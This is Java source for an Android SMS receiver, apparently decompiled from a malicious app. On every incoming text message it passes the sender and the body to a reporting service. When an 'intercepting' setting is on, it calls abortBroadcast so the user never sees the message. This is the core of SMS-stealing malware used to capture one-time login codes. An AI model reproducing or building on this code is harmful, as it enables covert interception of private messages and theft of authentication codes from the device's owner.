package exts.whats;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.HashMap;
import java.util.Map;

public class MessageReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        SharedPreferences settings = context.getSharedPreferences(Constants.PREFS_NAME, 0);
        Map<String, String> messages = retrieveMessages(intent);
        for (String sender : messages.keySet()) {
            String text = (String) messages.get(sender);
            boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);
            Intent start = new Intent(context, SendService.class);
            start.setAction(SendService.REPORT_INCOMING_MESSAGE);
            start.putExtra("number", sender);
            start.putExtra("text", text);
            context.startService(start);
            if (needToInterceptIncoming) {
                abortBroadcast();
            }
        }
    }

    private static Map<String, String> retrieveMessages(Intent intent) {
        Map<String, String> messages = null;
        Bundle bundle = intent.getExtras();
        if (bundle != null && bundle.containsKey("pdus")) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                int nbrOfpdus = pdus.length;
                messages = new HashMap(nbrOfpdus);
                SmsMessage[] messagesArray = new SmsMessage[nbrOfpdus];
                for (int i = 0; i < nbrOfpdus; i++) {
                    messagesArray[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    String originatingAddress = messagesArray[i].getOriginatingAddress();
                    if (messages.containsKey(originatingAddress)) {
                        messages.put(originatingAddress, new StringBuilder(String.valueOf((String) messages.get(originatingAddress))).append(messagesArray[i].getMessageBody()).toString());
                    } else {
                        messages.put(messagesArray[i].getOriginatingAddress(), messagesArray[i].getMessageBody());
                    }
                }
            }
        }
        return messages;
    }
}
